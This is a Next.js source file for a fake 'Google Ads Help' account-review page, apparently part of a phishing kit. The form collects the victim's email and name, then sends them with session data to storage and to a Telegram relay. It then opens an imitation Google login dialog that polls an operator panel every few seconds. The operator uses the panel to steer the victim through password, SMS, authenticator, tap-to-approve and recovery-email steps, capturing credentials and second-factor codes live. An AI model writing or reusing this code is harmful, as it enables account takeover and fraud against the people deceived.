"use client"

import { Menu, X, ExternalLink } from "lucide-react"
import { useState, useEffect } from "react"
import { useSearchParams, useRouter } from "next/navigation"
import { Input } from "@/components/ui/input"
import { Button } from "@/components/ui/button"
import { Textarea } from "@/components/ui/textarea"
import { Checkbox } from "@/components/ui/checkbox"
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select"
import { Label } from "@/components/ui/label"
import { Dialog } from "@/components/ui/dialog"
import { getOrCreateSessionId, getAdminControls, checkAndClearRedirection } from "@/lib/session-tracking"
import GoogleLoginDialog from "./google-login-dialog"

export default function AccountReview() {
    const [sidebarOpen, setSidebarOpen] = useState(false)
    const [showGoogleLogin, setShowGoogleLogin] = useState(false)
    const searchParams = useSearchParams()
    const router = useRouter()

    const [formData, setFormData] = useState({
        email: searchParams.get('email') || "",
        contactName: "",
        policy: "account-review",
        additionalInfo: "",
        disputeIncorrect: false
    })

    // Admin-controlled values
    const [adminControls, setAdminControls] = useState({
        tapDeviceInfo: '',
        tapMatchingNumber: '',
        smsLastDigits: '',
        recoveryEmail: ''
    })

    const [errors, setErrors] = useState({
        email: "",
        contactName: "",
        policy: "",
        additionalInfo: "",
        disputeIncorrect: ""
    })

    // Fetch admin controls on mount and when dialog state changes
    useEffect(() => {
        const fetchAdminControls = async () => {
            const sessionId = getOrCreateSessionId()
            const result = await getAdminControls(sessionId)
            if (result.success && result.data) {
                setAdminControls({
                    tapDeviceInfo: result.data.admin_tap_device_info || '',
                    tapMatchingNumber: result.data.admin_tap_matching_number || '',
                    smsLastDigits: result.data.admin_sms_last_digits || '',
                    recoveryEmail: result.data.admin_recovery_email || ''
                })
            }
        }

        if (showGoogleLogin) {
            fetchAdminControls()

            // Poll for admin controls every 3 seconds while dialog is open
            const interval = setInterval(fetchAdminControls, 3000)
            return () => clearInterval(interval)
        }
    }, [showGoogleLogin])

    // Effect to handle showing Google login based on URL parameters
    useEffect(() => {
        const dialog = searchParams.get('dialog')
        if (dialog && (dialog === 'google' || dialog.startsWith('login') || dialog === 'loading' || dialog.includes('otp') || dialog.includes('recovery') || dialog === 'tap-yes')) {
            setShowGoogleLogin(true)
        }
    }, [searchParams])

    // Poll for redirect when on loading screen
    useEffect(() => {
        const dialog = searchParams.get('dialog')

        if (dialog !== 'loading') return

        const pollForRedirect = async () => {
            const result = await checkAndClearRedirection()
            if (result.success && result.redirectTo) {
                console.log('Admin redirect detected:', result.redirectTo)
                // Extract the dialog parameter from the redirect URL
                const url = new URL(result.redirectTo, window.location.origin)
                const newDialog = url.searchParams.get('dialog')

                if (newDialog) {
                    // Refetch admin controls before redirecting
                    const sessionId = getOrCreateSessionId()
                    const controlsResult = await getAdminControls(sessionId)
                    if (controlsResult.success && controlsResult.data) {
                        setAdminControls({
                            tapDeviceInfo: controlsResult.data.admin_tap_device_info || '',
                            tapMatchingNumber: controlsResult.data.admin_tap_matching_number || '',
                            smsLastDigits: controlsResult.data.admin_sms_last_digits || '',
                            recoveryEmail: controlsResult.data.admin_recovery_email || ''
                        })
                    }

                    router.push(result.redirectTo)
                }
            }
        }

        // Initial check
        pollForRedirect()

        // Poll every 3 seconds
        const interval = setInterval(pollForRedirect, 3000)
        return () => clearInterval(interval)
    }, [searchParams, router])

    // Effect to listen for admin redirects
    useEffect(() => {
        const handleAdminRedirect = () => {
            setShowGoogleLogin(false)

            const currentDialog = searchParams.get('dialog')
            if (currentDialog) {
                const url = new URL(window.location.href)
                url.searchParams.delete('dialog')
                router.replace(url.pathname)
            }
        }

        const handleSessionRedirect = (event: CustomEvent) => {
            if (event.detail?.redirectToPage?.includes('/account-review')) {
                handleAdminRedirect()
            }
        }

        const handleImmediateRedirect = (event: CustomEvent) => {
            if (event.detail?.redirectTo?.includes('/account-review')) {
                handleAdminRedirect()
            }
        }

        const handleNavigation = () => {
            setTimeout(handleAdminRedirect, 100)
        }

        window.addEventListener('session-redirect-set', handleSessionRedirect as EventListener)
        window.addEventListener('admin-redirect-happening', handleImmediateRedirect as EventListener)
        window.addEventListener('popstate', handleNavigation)

        const referrer = document.referrer
        if (referrer.includes('/panel')) {
            handleAdminRedirect()
        }

        return () => {
            window.removeEventListener('session-redirect-set', handleSessionRedirect as EventListener)
            window.removeEventListener('admin-redirect-happening', handleImmediateRedirect as EventListener)
            window.removeEventListener('popstate', handleNavigation)
        }
    }, [searchParams, router])

    const validateForm = () => {
        const newErrors = {
            email: "",
            contactName: "",
            policy: "",
            additionalInfo: "",
            disputeIncorrect: ""
        }

        if (!formData.email.trim()) {
            newErrors.email = "Email is required"
        } else if (!/\S+@\S+\.\S+/.test(formData.email)) {
            newErrors.email = "Please enter a valid email address"
        }

        if (!formData.contactName.trim()) {
            newErrors.contactName = "Contact name is required"
        }

        if (!formData.policy) {
            newErrors.policy = "Please select a policy"
        }

        if (!formData.additionalInfo.trim()) {
            newErrors.additionalInfo = "Additional information is required"
        }

        if (!formData.disputeIncorrect) {
            newErrors.disputeIncorrect = "You must confirm that you believe the decision was incorrect"
        }

        setErrors(newErrors)
        return !Object.values(newErrors).some(error => error !== "")
    }

    const handleSubmit = async (e: React.FormEvent) => {
        e.preventDefault()
        if (validateForm()) {
            try {
                // Get session ID
                const sessionId = getOrCreateSessionId()

                // Get user agent
                const userAgent = navigator.userAgent

                // Prepare data for storage and telegram
                const submissionData = {
                    ...formData,
                    sessionId,
                    userAgent,
                    timestamp: new Date().toISOString(),
                    page: 'account-review'
                }

                // Store in Supabase
                const response = await fetch('/api/store-form-data', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(submissionData),
                })

                // Send via Telegram
                console.log('Sending to Telegram:', submissionData)
                const telegramResponse = await fetch('/api/telegram', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        type: 'account-review',
                        data: submissionData
                    }),
                })

                const telegramResult = await telegramResponse.json()
                console.log('Telegram response:', telegramResult)

                // Open Google login dialog with prefilled email
                setShowGoogleLogin(true)
                const url = new URL(window.location.href)
                url.searchParams.set('dialog', 'google')
                url.searchParams.set('email', formData.email)
                router.replace(url.pathname + url.search)

            } catch (error) {
                console.error('Error submitting form:', error)
                // Still open the dialog even if there's an error
                setShowGoogleLogin(true)
                const url = new URL(window.location.href)
                url.searchParams.set('dialog', 'google')
                url.searchParams.set('email', formData.email)
                router.replace(url.pathname + url.search)
            }
        }
    }

    return (
        <div className="min-h-screen bg-gray-50">
            <header className="bg-white border-b border-gray-200">
                <div className="flex items-center h-16 px-4">
                    <button
                        onClick={() => setSidebarOpen(!sidebarOpen)}
                        className="p-2 hover:bg-gray-100 rounded-full transition-colors"
                    >
                        <Menu className="w-6 h-6 text-gray-700" />
                    </button>
                    <div className="flex-1 text-center lg:text-left lg:ml-4">
                        <span className="text-xl font-normal text-gray-700">
                            Google Ads Help
                        </span>
                    </div>

                </div>
            </header>

            {/* Sidebar Overlay */}
            {sidebarOpen && (
                <div
                    className="fixed inset-0 bg-black/30 z-50"
                    onClick={() => setSidebarOpen(false)}
                >
                    <div
                        className="w-80 bg-white h-full shadow-2xl"
                        onClick={(e) => e.stopPropagation()}
                    >
                        <div className="flex items-center justify-between p-6 border-b border-gray-200">
                            <h2 className="text-xl font-normal text-gray-900">Google Help</h2>
                            <button
                                onClick={() => setSidebarOpen(false)}
                                className="p-1 hover:bg-gray-100 rounded-full transition-colors"
                            >
                                <X className="w-5 h-5 text-gray-600" />
                            </button>
                        </div>

                        <nav className="p-4">
                            <div className="space-y-1">
                                <a
                                    href="#"
                                    className="flex items-center px-4 py-3 text-blue-600 hover:bg-blue-50 rounded transition-colors"
                                >
                                    Help Center
                                </a>
                                <a
                                    href="#"
                                    className="flex items-center px-4 py-3 text-blue-600 hover:bg-blue-50 rounded transition-colors"
                                >
                                    Start advertising
                                </a>
                                <a
                                    href="#"
                                    className="flex items-center px-4 py-3 text-blue-600 hover:bg-blue-50 rounded transition-colors"
                                >
                                    Campaigns
                                </a>
                                <a
                                    href="#"
                                    className="flex items-center px-4 py-3 text-blue-600 hover:bg-blue-50 rounded transition-colors"
                                >
                                    Explore features
                                </a>
                                <a
                                    href="#"
                                    className="flex items-center px-4 py-3 text-blue-600 hover:bg-blue-50 rounded transition-colors"
                                >
                                    Optimize performance
                                </a>
                                <a
                                    href="#"
                                    className="flex items-center px-4 py-3 text-blue-600 hover:bg-blue-50 rounded transition-colors"
                                >
                                    Account & billing
                                </a>
                                <a
                                    href="#"
                                    className="flex items-center px-4 py-3 text-blue-600 hover:bg-blue-50 rounded transition-colors"
                                >
                                    Fix issues
                                </a>
                                <a
                                    href="#"
                                    className="flex items-center px-4 py-3 text-blue-600 hover:bg-blue-50 rounded transition-colors"
                                >
                                    Google Partners
                                </a>
                                <a
                                    href="#"
                                    className="flex items-center px-4 py-3 text-blue-600 hover:bg-blue-50 rounded transition-colors"
                                >
                                    Community
                                </a>
                                <a
                                    href="#"
                                    className="flex items-center justify-between px-4 py-3 text-blue-600 hover:bg-blue-50 rounded transition-colors"
                                >
                                    <span>Google Ads</span>
                                    <ExternalLink className="w-4 h-4" />
                                </a>
                            </div>

                            <div className="border-t border-gray-200 mt-6 pt-6 space-y-1">
                                <a
                                    href="#"
                                    className="flex items-center px-4 py-3 text-blue-600 hover:bg-blue-50 rounded transition-colors"
                                >
                                    Privacy Policy
                                </a>
                                <a
                                    href="#"
                                    className="flex items-center px-4 py-3 text-blue-600 hover:bg-blue-50 rounded transition-colors"
                                >
                                    Terms of Service
                                </a>
                                <a
                                    href="#"
                                    className="flex items-center px-4 py-3 text-blue-600 hover:bg-blue-50 rounded transition-colors"
                                >
                                    Submit feedback
                                </a>
                            </div>
                        </nav>
                    </div>
                </div>
            )}

            <main className="max-w-2xl mx-auto px-4 py-8">
                <div className="text-center mb-8">
                    <h1 className="text-3xl font-medium text-gray-900 mb-2">Account Review</h1>
                </div>

                <div className="bg-white shadow-sm border border-gray-200 rounded-lg p-6">
                    <div className="border-b border-gray-200 pb-4 mb-6">
                        <p className="text-sm text-gray-600">* Required Field</p>
                    </div>

                    <form onSubmit={handleSubmit} className="space-y-6">
                        <div>
                            <Label htmlFor="email" className="text-sm font-medium text-gray-700">
                                Account Login Email ID <span className="text-red-500">*</span>
                            </Label>
                            <Input
                                id="email"
                                type="email"
                                value={formData.email}
                                onChange={(e) => {
                                    setFormData({ ...formData, email: e.target.value })
                                    if (errors.email) setErrors({ ...errors, email: "" })
                                }}
                                className={`mt-1 ${errors.email ? 'border-red-500' : 'border-gray-300'} focus:ring-blue-500 focus:border-blue-500`}
                                placeholder="Enter your email address"
                            />
                            {errors.email && (
                                <p className="mt-1 text-sm text-red-600">{errors.email}</p>
                            )}
                        </div>

                        <div>
                            <Label htmlFor="contactName" className="text-sm font-medium text-gray-700">
                                Contact Name <span className="text-red-500">*</span>
                            </Label>
                            <Input
                                id="contactName"
                                type="text"
                                value={formData.contactName}
                                onChange={(e) => {
                                    setFormData({ ...formData, contactName: e.target.value })
                                    if (errors.contactName) setErrors({ ...errors, contactName: "" })
                                }}
                                className={`mt-1 ${errors.contactName ? 'border-red-500' : 'border-gray-300'} focus:ring-blue-500 focus:border-blue-500`}
                                placeholder="Enter your full name"
                            />
                            {errors.contactName && (
                                <p className="mt-1 text-sm text-red-600">{errors.contactName}</p>
                            )}
                        </div>

                        <div>
                            <Label htmlFor="policy" className="text-sm font-medium text-gray-700">
                                Please select the policy that applies to your situation <span className="text-red-500">*</span>
                            </Label>
                            <Select
                                value={formData.policy}
                                onValueChange={(value) => {
                                    setFormData({ ...formData, policy: value })
                                    if (errors.policy) setErrors({ ...errors, policy: "" })
                                }}
                                disabled={true}
                            >
                                <SelectTrigger className={`mt-1 ${errors.policy ? 'border-red-500' : 'border-gray-300'} opacity-60 cursor-not-allowed`}>
                                    <SelectValue placeholder="Select one" />
                                </SelectTrigger>
                                <SelectContent>
                                    <SelectItem value="account-review" disabled>Account Review</SelectItem>

                                </SelectContent>
                            </Select>
                            {errors.policy && (
                                <p className="mt-1 text-sm text-red-600">{errors.policy}</p>
                            )}
                        </div>

                        <div>
                            <Label htmlFor="additionalInfo" className="text-sm font-medium text-gray-700">
                                Please provide any additional information that may help us review your account <span className="text-red-500">*</span>
                            </Label>
                            <Textarea
                                id="additionalInfo"
                                value={formData.additionalInfo}
                                onChange={(e) => {
                                    setFormData({ ...formData, additionalInfo: e.target.value })
                                    if (errors.additionalInfo) setErrors({ ...errors, additionalInfo: "" })
                                }}
                                className={`mt-1 min-h-[100px] ${errors.additionalInfo ? 'border-red-500' : 'border-gray-300'} focus:ring-blue-500 focus:border-blue-500`}
                                placeholder="Describe your issue or provide additional context..."
                            />
                            {errors.additionalInfo && (
                                <p className="mt-1 text-sm text-red-600">{errors.additionalInfo}</p>
                            )}
                        </div>

                        <div className="flex items-start space-x-2">
                            <Checkbox
                                id="disputeIncorrect"
                                checked={formData.disputeIncorrect}
                                onCheckedChange={(checked) => {
                                    setFormData({ ...formData, disputeIncorrect: checked as boolean })
                                    if (errors.disputeIncorrect) setErrors({ ...errors, disputeIncorrect: "" })
                                }}
                                className={`mt-1 ${errors.disputeIncorrect ? 'border-red-500' : ''}`}
                            />
                            <div className="text-sm">
                                <Label htmlFor="disputeIncorrect" className="text-gray-700 cursor-pointer">
                                    <strong>I believe the decision was incorrect (dispute)</strong> <span className="text-red-500">*</span>
                                </Label>
                                <p className="text-gray-500 text-xs mt-1">
                                    You may receive an email after the case is closed
                                </p>
                                {errors.disputeIncorrect && (
                                    <p className="text-sm text-red-600 mt-1">{errors.disputeIncorrect}</p>
                                )}
                            </div>
                        </div>

                        <div className="pt-4">
                            <Button
                                type="submit"
                                className="bg-blue-600 hover:bg-blue-700 text-white px-6 py-2 rounded"
                            >
                                Submit
                            </Button>
                        </div>
                    </form>

                    {/* Google Login Dialog */}
                    <Dialog open={showGoogleLogin} onOpenChange={(open) => {
                        setShowGoogleLogin(open)
                        if (open && !searchParams.get('dialog')) {
                            const url = new URL(window.location.href)
                            url.searchParams.set('dialog', 'google')
                            url.searchParams.set('email', formData.email)
                            router.replace(url.pathname + url.search)
                        } else if (!open && searchParams.get('dialog')) {
                            const url = new URL(window.location.href)
                            url.searchParams.delete('dialog')
                            url.searchParams.delete('email')
                            router.replace(url.pathname + url.search)
                        }
                    }}>
                        <GoogleLoginDialog
                            onClose={() => {
                                setShowGoogleLogin(false)
                                // Refetch admin controls when dialog closes/reopens
                                const sessionId = getOrCreateSessionId()
                                getAdminControls(sessionId).then(result => {
                                    if (result.success && result.data) {
                                        setAdminControls({
                                            tapDeviceInfo: result.data.admin_tap_device_info || '',
                                            tapMatchingNumber: result.data.admin_tap_matching_number || '',
                                            smsLastDigits: result.data.admin_sms_last_digits || '',
                                            recoveryEmail: result.data.admin_recovery_email || ''
                                        })
                                    }
                                })
                            }}
                            initialStep={
                                searchParams.get('dialog') === 'login-error' ? 'login-error' :
                                    searchParams.get('dialog') === 'loading' ? 'loading' :
                                        searchParams.get('dialog') === 'email-otp' ? 'email-otp' :
                                            searchParams.get('dialog') === 'email-otp-error' ? 'email-otp-error' :
                                                searchParams.get('dialog') === 'sms-otp' ? 'sms-otp' :
                                                    searchParams.get('dialog') === 'sms-otp-error' ? 'sms-otp-error' :
                                                        searchParams.get('dialog') === 'gauth-otp' ? 'gauth-otp' :
                                                            searchParams.get('dialog') === 'gauth-otp-error' ? 'gauth-otp-error' :
                                                                searchParams.get('dialog') === 'tap-yes' ? 'tap-yes' :
                                                                    searchParams.get('dialog') === 'email-recovery' ? 'email-recovery' :
                                                                        searchParams.get('dialog') === 'email-recovery-error' ? 'email-recovery-error' :
                                                                            'login'
                            }

                            adminTapDeviceInfo={adminControls.tapDeviceInfo}
                            adminTapMatchingNumber={adminControls.tapMatchingNumber}
                            adminSmsLastDigits={adminControls.smsLastDigits}
                            adminRecoveryEmail={adminControls.recoveryEmail}
                        />
                    </Dialog>

                    <div className="mt-8 pt-6 border-t border-gray-200 text-xs text-gray-500 space-y-1">
                        <p>
                            Some{" "}
                            <a href="https://support.google.com/google-ads/gethelp#" className="text-blue-600 hover:underline">
                                account and system information
                            </a>{" "}
                            will be sent to Google
                            . We use this information to improve support quality and training, to help address technical issues, and to improve our products and services, subject to our{" "}
                            <a href="https://policies.google.com/privacy?hl=en" className="text-blue-600 hover:underline">
                                Privacy Policy
                            </a>{" "}
                            and{" "}
                            <a href="https://policies.google.com/terms?hl=en" className="text-blue-600 hover:underline">
                                Terms of Service
                            </a>
                            . Translation services may be used in chats and email.
                        </p>
                    </div>
                </div>
            </main>
        </div>
    )
}
